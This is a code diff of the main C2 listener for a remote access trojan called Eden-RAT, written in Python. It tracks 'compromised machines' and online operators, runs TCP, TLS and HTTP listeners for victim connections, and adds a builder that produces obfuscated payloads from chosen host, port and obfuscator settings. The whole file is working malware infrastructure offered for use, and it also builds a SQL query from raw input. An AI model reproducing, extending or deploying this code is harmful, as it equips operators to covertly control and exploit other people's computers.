@@ -1,3 +1,8 @@
+'''
+Eden-RAT main listener, for handling C2 users.
+It provides interfaces for templates.
+'''
+
 import socket
 import threading
 import json
@@ -5,18 +10,18 @@ import time
 import os
 import sys
 import uuid
-from datetime import datetime
+
 import importlib.util
 import argparse
 import logging
 
 from lib.C2P import C2P
 from lib.Client import Client
-from lib.ColorPrint import ColorPrint as cp
 from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
 from lib.database import DB
 from lib.tool import EZData, EZClass
 from lib.EZPayload import get_payload
+from lib.Builder import Builder
 
 import lib.c2login as c2login
 
@@ -31,6 +36,8 @@ class Listener:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((ip, port))
 
+        self.listening = False
+
         self.sock = sock
         self.bListen = sock.fileno() != -1
         self.db = DB()
@@ -38,22 +45,47 @@ class Listener:
         self.events_recv_handler = []
         self.events_msg_handler = []
 
-        self.dic_victim = {}
-        self.dic_user = {}
-        self.dic_listener = {}
-        self.dic_token = {}
+        self.dic_victim = {} # store compromised machines.
+        self.dic_user = {} # store online C2 users.
+        self.dic_listener = {} # store all in running templates(listeners).
+        self.dic_token = {} # store C2 usernames and their tokens. A token(random) provides anonymity feature for C2 user since the executed payload has to identify C2 users.
 
     def start(self):
         self.sock.listen(100)
+        self.sock.settimeout(1)
+        self.listening = True
         self.log.debug(f'listening: {self.sock.getsockname()[1]}')
         
-        while True:
-            conn, addr = self.sock.accept()
+        while self.listening:
+            try:
+                conn, addr = self.sock.accept()
+            except socket.timeout:
+                continue
+            except OSError: # socket closed.
+                break
+            except KeyboardInterrupt:
+                self.log.debug('User interrupted.')
+                break
+            except Exception as ex:
+                self.log.error(str(ex))
+            
             self.log.debug(f'New client: ({addr[0]},{addr[1]})')
-            threading.Thread(target=self.handler, args=[conn, addr, ]).start()
+
+            thd = threading.Thread(target=self.handler, args=[conn, addr, ])
+            thd.daemon = True
+            thd.start()
+
+        self.log.debug('Server is terminated.')
 
     def stop(self):
-        self.sock.close()
+        try:
+            self.listening = False
+            self.sock.close()
+            self.log.info(f'Main listener is stopped.')
+            return True
+        except Exception as ex:
+            self.log.error(str(ex))
+            return False
 
     def listener_start_all(self):
         ls_output = DB().sql_execute('SELECT Name FROM Listener')
@@ -65,45 +97,49 @@ class Listener:
             t.start()
 
     def listener_start(self, szName: str):
-        if szName in self.dic_listener.keys():
-            self.dic_listener.pop(szName)
+        try:
+            if szName in self.dic_listener.keys():
+                self.dic_listener.pop(szName)
 
-        sql_query = f'SELECT Name,Template,IP,Port FROM Listener WHERE Name = \'{szName}\''
-        ls_output = DB().sql_execute(sql_query)
+            sql_query = f'SELECT Name,Template,IP,Port FROM Listener WHERE Name = \'{szName}\''
+            ls_output = DB().sql_execute(sql_query)
 
-        if len(ls_output) == 0:
-            self.log.error('sql_execute() error, query: ' + sql_query)
-            return
-        
-        ls_row = ls_output[0]
+            if len(ls_output) == 0:
+                self.log.error('sql_execute() error, query: ' + sql_query)
+                return
+            
+            ls_row = ls_output[0]
 
-        szTemplate = ls_row[1]
-        szIP = ls_row[2]
-        nPort = int(ls_row[3])
+            szTemplate = ls_row[1]
+            szIP = ls_row[2]
+            nPort = int(ls_row[3])
 
-        objListener = c2user.get_template(szTemplate)
-        if objListener == None:
-            return
+            objListener = c2user.get_template(szTemplate)
+            if objListener == None:
+                return
 
-        #objListener.__init__(szIP, nPort)
-        objClass = getattr(objListener, 'Listener')
-        objListener = None
+            #objListener.__init__(szIP, nPort)
+            objClass = getattr(objListener, 'Listener')
+            objListener = None
 
-        if szTemplate == 'TCP':
-            objListener = objClass(szIP, nPort, self)
-        elif szTemplate == 'TLS':
-            objListener = objClass(szIP, nPort, self, 'certfile', 'pemfile')
-        elif szTemplate == 'HTTP':
-            objListener = objClass(szIP, nPort, self)
-        else:
-            raise Exception('Unknown template: ' + szTemplate)
+            if szTemplate == 'TCP':
+                objListener = objClass(szIP, nPort, self)
+            elif szTemplate == 'TLS':
+                objListener = objClass(szIP, nPort, self, 'certfile', 'pemfile')
+            elif szTemplate == 'HTTP':
+                objListener = objClass(szIP, nPort, self)
+            else:
+                raise Exception('Unknown template: ' + szTemplate)
 
-        objListener.set_msg_handler(c2victim.msg_handler)
-        self.dic_listener[szName] = EZClass.Listener(szName, szTemplate, szIP, nPort, objListener)
+            objListener.set_msg_handler(c2victim.msg_handler)
+            self.dic_listener[szName] = EZClass.Listener(szName, szTemplate, szIP, nPort, objListener)
 
-        self.log.debug(f'Listener: {szName}, Port: {nPort}')
+            self.log.debug(f'Listener(Name={szName}, Port={nPort}) is running.')
 
-        objListener.start()
+            objListener.start()
+
+        except Exception as ex:
+            self.log.error(str(ex))
 
     def listener_stop(self, szName):
         objListener = self.dic_listener[szName].objListener
@@ -114,8 +150,15 @@ class Listener:
         return db.add_listener(szName, szTemplate, '*', nPort, clnt.username)
     
     def del_listener(self, szName) -> bool:
-        self.listener_stop(szName)
-        self.dic_listener.pop(szName)
+        listener_obj = self.dic_listener.pop(szName, None)
+
+        if not listener_obj:
+            return False
+        
+        try:
+            listener_obj.objListener.stop()
+        except Exception as ex:
+            self.log.error(str(ex))
 
         return DB().del_listener(szName)
     
@@ -140,7 +183,7 @@ class Listener:
         clnt.addr = clnt_addr
 
         try:
-            while clnt_sock.fileno() != -1:
+            while True:
                 abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                 nRecvLength = len(abStaticRecv)
 
@@ -185,7 +228,7 @@ class Listener:
                                 xml_PubKey = EZRSA(n_rsa_keysize).encode_public_key(n, e)
                                 xml_PrivKey = EZRSA(n_rsa_keysize).encode_private_key(n, e, d, p, q)
 
-                                self.log.debug('RSA key pair is generated: {clnt.addr}')
+                                self.log.debug(f'RSA key pair is generated: {clnt.addr}')
 
                                 clnt.xml_rsa_pubKey = xml_PubKey
                                 clnt.xml_rsa_privKey = xml_PrivKey
@@ -213,7 +256,7 @@ class Listener:
 
                                     clnt.set_aes(PAES(ab_iv, ab_key))
                                     
-                                    self.log.debug('RSA Decrypt successfully, the server obtain both AES key and IV: {clnt.addr}')
+                                    self.log.debug(f'RSA Decrypt successfully, the server obtain both AES key and IV: {clnt.addr}')
 
                                     # Do challenge and response for vertification.
                                     self.log.debug(f'Do challenge and response for vertification..: {clnt.addr}')
@@ -221,7 +264,7 @@ class Listener:
                                     clnt.szChallenge = C2P.random_str(100)
                                     threading.Thread(target=lambda: clnt.send(1, 3, clnt.szChallenge)).start()
                                 else:
-                                    self.log.error('Invalid received abMsg: {clnt.addr}')
+                                    self.log.error(f'Invalid received abMsg: {clnt.addr}')
                                     self.log.debug(f'Restart key exchange..: {clnt.addr}')
 
                                     clnt.send(1, 0, C2P.random_str())
@@ -233,11 +276,11 @@ class Listener:
                                 szPlainResp = clnt.pAES.decrypt_cbc(ab_enc_resp).decode('utf-8')
 
                                 if szPlainResp == clnt.szChallenge:
-                                    self.log.debug('Vertification successed: {clnt.addr}')
+                                    self.log.debug(f'Vertification successed: {clnt.addr}')
 
                                     clnt.sendcommand(1, 5)
                                 else:
-                                    self.log.error('Vertification failed: {clnt.addr}')
+                                    self.log.error(f'Vertification failed: {clnt.addr}')
                         elif nCmd == 3: # C2 User
                             szDecMsg = clnt.pAES.decrypt_cbc(abMsg).decode('utf-8')
                             aMsg = szDecMsg.split('|')
@@ -269,7 +312,11 @@ class Listener:
                             elif nParam == 3: # Command
                                 if aMsg[0] == 'user':
                                     szUsername = aMsg[1]
-                                    c2user.user_message_handler(self, clnt, aMsg[2:])
+                                    try:
+                                        c2user.user_message_handler(self, clnt, aMsg[2:])
+                                    except OSError as ex:
+                                        if ex.errno == 32:
+                                            raise Exception('User offline: ' + szUsername)
                                 elif aMsg[0] == 'victim':
                                     szUsername = aMsg[1]
                                     szVictimID = aMsg[2]
@@ -281,14 +328,16 @@ class Listener:
                                             threading.Thread(target=c2victim.clnt_msg_handler, args=[self, szUsername, obj_dic[szVictimID], aMsg[3:]]).start()
 
             if clnt.username:
-                self.dic_user.pop(clnt.username)
-                self.dic_token.pop(clnt.szUUID)
+                if clnt.username in self.dic_user.keys():
+                    self.dic_user.pop(clnt.username)
+                    self.dic_token.pop(clnt.szUUID)
                 self.log.debug(f'User offline: {clnt.username}')
         except Exception as ex:
             self.log.error(ex)
-            self.dic_user.pop(clnt.username)
-            self.dic_token.pop(clnt.szUUID)
-            #raise ex
+            if clnt.username in self.dic_user.keys():
+                self.dic_user.pop(clnt.username)
+                self.dic_token.pop(clnt.szUUID)
+            raise ex
     
     def boardcast_clnt(self, aMsg: list):
         if len(self.dic_user.keys()) == 0:
@@ -300,7 +349,6 @@ class Listener:
         for szToken in self.dic_token.keys():
             if not self.send_clnt(szToken, aMsg):
                 self.log.error(szToken)
-                print(aMsg)
                 continue
 
     def send_clnt(self, szToken: str, aMsg: list) -> bool:
@@ -359,6 +407,8 @@ class c2user:
 
                     clnt.sendclntls(ls_data)
                 elif aMsg[2] == 'listener':
+                    c2user.log.debug(f'{clnt.addr}: list listener.')
+
                     ls_result = DB().sql_execute('SELECT * FROM Listener')
                     szMsg = EZData.twoDlist2str(ls_result)
 
@@ -372,12 +422,17 @@ class c2user:
 
                     clnt.sendclntls(ls_data)
             elif aMsg[1] == 'add':
+                c2user.log.debug(f'{clnt.addr}: add')
+
                 szTemplate = aMsg[2]
                 szName = Encoder.b64d2str(aMsg[3])
                 nPort = int(aMsg[4])
 
                 bResult = listener.add_listener(clnt, szTemplate, szName, nPort)
-                listener.listener_start(szName)
+
+                thd = threading.Thread(target=listener.listener_start, args=[szName, ])
+                thd.daemon = True
+                thd.start()
                 
                 ls = [
                     '*',
@@ -408,25 +463,153 @@ class c2user:
 
             elif aMsg[1] == 'del':
                 lsListener = EZData.oneSpliter2list(aMsg[2])
-                
-                db = DB()
+
+                # obtain all online machines from the listener which will be delete.
+                lsVictim = []
+                for szName in lsListener:
+                    if szName not in lsListener:
+                        continue
+
+                    objListener = listener.dic_listener[szName].objListener
+
+                    for clnt_addr in objListener.dic_victim.keys():
+                        victim = objListener.dic_victim[clnt_addr]
+                        victim_id = victim.szOnlineID
+                        lsVictim.append(victim_id)
+
                 ls_output = [listener.del_listener(szName) for szName in lsListener]
 
-                del db
-
-                bResult = any(not x for x in ls_output)
+                bResult = any(ls_output)
                 
                 ls = [
                     '*',
                     'listener',
                     'del',
                     '1' if bResult else '0',
-                ]    
+                    EZData.list2str(lsVictim),
+                ]
 
                 clnt.sendclntls(ls)
 
             elif aMsg[1] == 'info':
                 pass
+
+        elif aMsg[0] == 'builder':
+            if aMsg[1] == 'build':
+                try:
+                    config = json.loads(aMsg[2])
+                    host = config['host']
+                    port = config['port']
+                    template = config['template']
+                    interval_info = config['interval_info']
+                    interval_reconn = config['interval_reconn']
+                    obfus = config['obfuscator']
+
+                    tag = config['tag']
+
+                    config = Builder.BuildConfig(host, port, template, interval_info, interval_reconn, obfus)
+                    builder = Builder(tag)
+                    payload = builder.build(config)
+
+                    ls = [
+                        '*',
+                        'builder',
+                        'payload',
+                        '1',
+                        payload,
+                    ]
+
+                    clnt.sendclntls(ls)
+
+                except Exception as ex:
+                    clnt.sendclntls([
+                        '*',
+                        'builder',
+                        'payload',
+                        '0',
+                        str(ex),
+                    ])
+
+            elif aMsg[1] == 'ls':
+                if aMsg[2] == 'tag':
+                    try:
+                        ls = []
+                        with os.scandir('./lib/payload') as entries:
+                            for entry in entries:
+                                ls.append(os.path.basename(entry.name))
+
+                        clnt.sendclntls([
+                            '*',
+                            'builder',
+                            'ls',
+                            'tag',
+                            '1',
+                            EZData.list2str(ls),
+                        ])
+
+                    except Exception as ex:
+
+                        clnt.sendclntls([
+                            '*',
+                            'builder',
+                            'ls',
+                            'tag',
+                            '0',
+                            str(ex),
+                        ])
+
+                elif aMsg[2] == 'listener':
+                    try:
+                        ls = DB().sql_execute('SELECT Name, Template, Port FROM Listener')
+
+                        clnt.sendclntls([
+                            '*',
+                            'builder',
+                            'ls',
+                            'listener',
+                            '1',
+                            EZData.twoDlist2str(ls),
+                        ])
+                    
+                    except Exception as ex:
+                        clnt.sendclntls([
+                            '*',
+                            'builder',
+                            'ls',
+                            'listener',
+                            '0',
+                            str(ex),
+                        ])
+
+                elif aMsg[2] == 'obfuscator':
+                    try:
+                        ls = []
+                        with os.scandir('./lib/obfuscator') as entries:
+                            for entry in entries:
+                                if entry.is_dir():
+                                    continue
+
+                                filename = os.path.basename(entry.name)
+                                ls.append(os.path.splitext(filename)[0])
+
+                        clnt.sendclntls([
+                            '*',
+                            'builder',
+                            'ls',
+                            'obfuscator',
+                            '1',
+                            EZData.list2str(ls),
+                        ])
+
+                    except Exception as ex:
+                        clnt.sendclntls([
+                            '*',
+                            'builder',
+                            'ls',
+                            'obfuscator',
+                            '0',
+                            str(ex),
+                        ])
 
     @staticmethod
     def get_template(name: str):
